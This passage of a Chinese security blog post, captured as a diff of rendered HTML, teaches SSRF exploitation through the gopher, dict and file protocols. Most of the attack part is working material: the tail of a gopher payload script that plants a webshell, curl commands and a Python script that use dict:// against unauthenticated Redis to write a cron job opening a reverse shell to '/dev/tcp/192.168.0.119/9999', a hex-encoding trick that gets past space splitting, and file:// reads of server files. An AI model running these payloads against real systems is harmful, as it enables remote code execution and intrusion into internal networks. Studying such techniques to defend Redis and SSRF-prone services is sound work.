+</span><span>encoder = </span><span style="color:#bf616a;">encoder_url</span><span>(</span><span style="color:#bf616a;">encoder_url</span><span>(data))
+</span><span>
+</span><span style="color:#b48ead;">print </span><span>encoder
+</span><span style="color:#65737e;"># 生存payload
+</span><span>payload = url + urllib.</span><span style="color:#bf616a;">quote</span><span>(gopher,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;) + encoder
+</span><span>
+</span><span style="color:#65737e;"># 发起请求
+</span><span>request = urllib2.</span><span style="color:#bf616a;">Request</span><span>(payload)
+</span><span>response = urllib2.</span><span style="color:#bf616a;">urlopen</span><span>(request).</span><span style="color:#bf616a;">read</span><span>()
+</span><span style="color:#b48ead;">print </span><span>response
+</span></code></pre>
+<p>执行后可以看到目标主机有了margin.php文件，使用菜刀连接即可。</p>
+<h2 id="ssrflou-dong-zhong-shi-yong-dao-de-qi-ta-xie-yi">SSRF漏洞中使用到的其他协议</h2>
+<h3 id="0x01-dictxie-yi">0x01 dict协议</h3>
+<p><strong>定义</strong>：词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。（摘自百度百科）<br /><strong>DICT协议在SSRF漏洞中使用</strong><br />在SSRF利用中，gopher协议无疑是最好用的，但gopher协议的使用是有一定条件的，如下：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624868913528-040da6d1-7a06-4835-b300-6a197ba3824b.png#align=left&amp;display=inline&amp;height=173&amp;margin=%5Bobject%20Object%5D&amp;originHeight=173&amp;originWidth=1440&amp;size=0&amp;status=done&amp;style=none&amp;width=1314" alt="" /></p>
+<p>当gopher协议无法使用时，怎么办？这时候可以使用dict协议，我们先看执行效果：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624868913549-a916b208-9986-4095-ac28-033a0fb8671f.png#align=left&amp;display=inline&amp;height=140&amp;margin=%5Bobject%20Object%5D&amp;originHeight=140&amp;originWidth=1330&amp;size=0&amp;status=done&amp;style=none&amp;width=1330" alt="" /><br />由上图可以发现通过dict协议，可以看出目标端口的指纹信息，通过上图返回的指纹信息，可以明确，是6379的redis数据库。OK，现在我们知道，利用dict协议可以探测端口的开放情况和指纹信息，那么dict协议怎么进一步使用？有什么语法？以下为dict协议的使用：</p>
+<ol>
+<li>dict://serverip:port/命令:参数</li>
+<li>向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</li>
+<li>通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</li>
+</ol>
+<p>明白利用方法后，我们可以使用dict协议执行命令，例如可以获取redis的变量</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">margine:~</span><span> margin$ curl dict://192.168.0.67:6379/get:name
+</span><span style="color:#bf616a;">-ERR</span><span> Syntax error, try CLIENT (LIST | </span><span style="color:#bf616a;">KILL</span><span> ip:port | </span><span style="color:#bf616a;">GETNAME </span><span>| </span><span style="color:#bf616a;">SETNAME</span><span> connection-name)
+</span><span>$</span><span style="color:#bf616a;">6
+</span><span style="color:#bf616a;">Margin
+</span><span style="color:#bf616a;">+OK
+</span></code></pre>
+<p>通过dict协议利用redis的未授权访问反弹shell的步骤如下：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#65737e;"># 1、开启反弹shell的监听
+</span><span style="color:#bf616a;">nc -l</span><span> 9999
+</span><span style="color:#65737e;"># 2、依次执行下面的命令
+</span><span style="color:#bf616a;">curl</span><span> dict://192.168.0.119:6379/set:mars:&quot;</span><span style="color:#a3be8c;">\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n</span><span>&quot;
+</span><span style="color:#bf616a;">curl</span><span> dict://192.168.0.119:6379/config:set:dir:/etc/
+</span><span style="color:#bf616a;">curl</span><span> dict://192.168.0.119:6379/config:set:dbfilename:crontab
+</span><span style="color:#bf616a;">curl</span><span> dict://192.168.0.119:6379/bgsave
+</span></code></pre>
+<p>执行时，反弹shell的命令，也就是set:mars:xxx，会因为特殊字符的原因无法写入到目标的redis中，被被空格所分割导致出现一下情况：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>1584705879.520734 [0 172.17.0.1:44488] &quot;set&quot; &quot;mars&quot; &quot;\\n\\n*&quot; &quot;*&quot; &quot;*&quot; &quot;*&quot; &quot;*&quot; &quot;root&quot; &quot;bash&quot; &quot;-i&quot; &quot;&gt;&amp;&quot; &quot;/dev/tcp/192.168.0.119/6789&quot; &quot;0&gt;&amp;1\\n\\n&quot;
+</span></code></pre>
+<p>根据上图我们会发现，命令被分割了，看表象感觉像是被空格分割了。此时将反弹shell的命令进行十六进制转换，变为：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl</span><span> dict://192.168.0.119:6379/set:mars:</span><span style="color:#96b5b4;">\&quot;\\</span><span>x0a</span><span style="color:#96b5b4;">\\</span><span>x2a</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x2a</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x2a</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x2a</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x2a</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x72</span><span style="color:#96b5b4;">\\</span><span>x6f</span><span style="color:#96b5b4;">\\</span><span>x6f</span><span style="color:#96b5b4;">\\</span><span>x74</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x62</span><span style="color:#96b5b4;">\\</span><span>x61</span><span style="color:#96b5b4;">\\</span><span>x73</span><span style="color:#96b5b4;">\\</span><span>x68</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x2d</span><span style="color:#96b5b4;">\\</span><span>x69</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x3e</span><span style="color:#96b5b4;">\\</span><span>x26</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x2f</span><span style="color:#96b5b4;">\\</span><span>x64</span><span style="color:#96b5b4;">\\</span><span>x65</span><span style="color:#96b5b4;">\\</span><span>x76</span><span style="color:#96b5b4;">\\</span><span>x2f</span><span style="color:#96b5b4;">\\</span><span>x74</span><span style="color:#96b5b4;">\\</span><span>x63</span><span style="color:#96b5b4;">\\</span><span>x70</span><span style="color:#96b5b4;">\\</span><span>x2f</span><span style="color:#96b5b4;">\\</span><span>x31</span><span style="color:#96b5b4;">\\</span><span>x39</span><span style="color:#96b5b4;">\\</span><span>x32</span><span style="color:#96b5b4;">\\</span><span>x2e</span><span style="color:#96b5b4;">\\</span><span>x31</span><span style="color:#96b5b4;">\\</span><span>x36</span><span style="color:#96b5b4;">\\</span><span>x38</span><span style="color:#96b5b4;">\\</span><span>x2e</span><span style="color:#96b5b4;">\\</span><span>x30</span><span style="color:#96b5b4;">\\</span><span>x2e</span><span style="color:#96b5b4;">\\</span><span>x31</span><span style="color:#96b5b4;">\\</span><span>x31</span><span style="color:#96b5b4;">\\</span><span>x39</span><span style="color:#96b5b4;">\\</span><span>x2f</span><span style="color:#96b5b4;">\\</span><span>x39</span><span style="color:#96b5b4;">\\</span><span>x39</span><span style="color:#96b5b4;">\\</span><span>x39</span><span style="color:#96b5b4;">\\</span><span>x39</span><span style="color:#96b5b4;">\\</span><span>x20</span><span style="color:#96b5b4;">\\</span><span>x30</span><span style="color:#96b5b4;">\\</span><span>x3e</span><span style="color:#96b5b4;">\\</span><span>x26</span><span style="color:#96b5b4;">\\</span><span>x31</span><span style="color:#96b5b4;">\\</span><span>x0a</span><span style="color:#96b5b4;">\&quot;
+</span></code></pre>
+<p>以上单引号使用反斜杠\进行转移，其他数据进行十六进制编码，执行结果如下，可以发现没有错误了</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>1584706087.980465 [0 172.17.0.1:44490] &quot;set&quot; &quot;mars&quot; &quot;\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n&quot;
+</span></code></pre>
+<p>剩下的修改路径和文件名称的请求，正常执行即可，脚本如下：</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python
+</span><span style="color:#65737e;"># -*- coding: UTF-8 -*-
+</span><span style="color:#b48ead;">import </span><span>urllib2,urllib,binascii
+</span><span>url = &quot;</span><span style="color:#a3be8c;">http://192.168.0.109/ssrf/base/curl_exec.php?url=</span><span>&quot;
+</span><span>target = &quot;</span><span style="color:#a3be8c;">dict://192.168.0.119:6379/</span><span>&quot;
+</span><span>cmds = [&#39;</span><span style="color:#a3be8c;">set:mars:</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">&quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">n</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">&quot;</span><span>&#39;,
+</span><span>       &quot;</span><span style="color:#a3be8c;">config:set:dir:/etc/</span><span>&quot;,
+</span><span>       &quot;</span><span style="color:#a3be8c;">config:set:dbfilename:crontab</span><span>&quot;,
+</span><span>       &quot;</span><span style="color:#a3be8c;">bgsave</span><span>&quot;]
+</span><span>
+</span><span style="color:#b48ead;">for </span><span>cmd </span><span style="color:#b48ead;">in </span><span>cmds:
+</span><span>    cmd_encoder = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">for </span><span>single_char </span><span style="color:#b48ead;">in </span><span>cmd:
+</span><span>        </span><span style="color:#65737e;"># 先转为ASCII
+</span><span>        cmd_encoder += </span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(single_char)).</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">0x</span><span>&quot;,&quot;&quot;)
+</span><span>    cmd_encoder = binascii.</span><span style="color:#bf616a;">a2b_hex</span><span>(cmd_encoder)
+</span><span>    cmd_encoder = urllib.</span><span style="color:#bf616a;">quote</span><span>(cmd_encoder,&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;)
+</span><span>
+</span><span>    payload = url + target + cmd_encoder
+</span><span>    </span><span style="color:#b48ead;">print </span><span>payload
+</span><span>    request = urllib2.</span><span style="color:#bf616a;">Request</span><span>(payload)
+</span><span>    response = urllib2.</span><span style="color:#bf616a;">urlopen</span><span>(request).</span><span style="color:#bf616a;">read</span><span>()
+</span></code></pre>
+<p>但很多时候我们利用ssrf漏洞去攻击内网服务器的时候，并不知道内网中有什么样的应用、IP地址是多少、开放了什么端口、端口对应的服务是什么。所以需要先对内网做IP+端口的扫描，如果开放的服务是redis才能使用上文讲到的利用方法，对于不同的应用有不同的扫描方法，例如，redis的扫描可以请求以下内容来根据回显内容进行判断是否为redis，其他的服务也是同样道理，只要知道服务的指纹，然后与自己的指纹库进行比对即可：</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl</span><span> dict://192.168.0.119:6379/
+</span></code></pre>
+<h3 id="0x02-filexie-yi">0x02 file协议</h3>
+<p>file协议主要用于访问本地计算机中的文件，命令格式为：</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>file://文件路径
+</span></code></pre>
+<p>使用file协议可以直接读取目标操作系统的文件，例如使用以下方法来读取<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1624869371771-7e72f093-a07b-4640-aab1-a63680e8883c.png#align=left&amp;display=inline&amp;height=194&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=194&amp;originWidth=1850&amp;size=269518&amp;status=done&amp;style=none&amp;width=1850" alt="image.png" /><br />file协议和http协议有什么区别呢？</p>
+<ul>
+<li>file协议主要用于读取服务器本地文件，访问的是本地的静态资源</li>
+<li>http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</li>
+<li>http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</li>
+<li>file对应的类似http的协议是ftp协议（文件传输协议）</li>
+<li>file不能跨域</li>
+</ul>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Baz
+                
+                
+                    
+                    in <a href="https://baz.ee/categories/an-quan/">安全</a>
+                
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
